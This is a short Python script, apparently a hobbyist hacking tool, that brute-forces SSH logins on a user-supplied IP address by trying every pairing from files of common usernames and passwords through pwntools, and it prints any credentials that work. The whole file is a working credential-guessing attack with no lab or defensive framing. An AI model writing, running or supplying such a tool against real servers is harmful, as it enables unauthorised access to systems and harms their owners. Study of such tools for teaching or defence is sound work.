from pwn import * 
import paramiko
import ipaddress

try:
    host = input("Enter the Target IP address:")
    ipaddress.ip_address(host)
except:
    print("Invalid IP address!")
    exit()

attempts = 0 

def ssh_crack():
    global attempts
    with open("ssh-common-usernames.txt","r") as username_list:
        for username in username_list:
            username = username.strip("\n")
            with open("ssh-common-passwords.txt","r") as password_list:
                for password in password_list:
                    password = password.strip("\n")
                    try:
                        print(f"[{attempts}] attempting with username = {username} & password = {password} for login...")
                        ssh_response = ssh(host=host,user=username,password=password, timeout=1)
                        if ssh_response.connected():
                            print(f"[>]Username = {username} and Password = {password} is successful!...")
                            ssh_response.close()
                            return  
                        else:
                            ssh_response.close()
                    except KeyboardInterrupt:
                        print("[XXX] User stopped the execution")
                        return
                    except  Exception as e:
                        print("\n")
                    attempts +=1
                    


ssh_crack()

        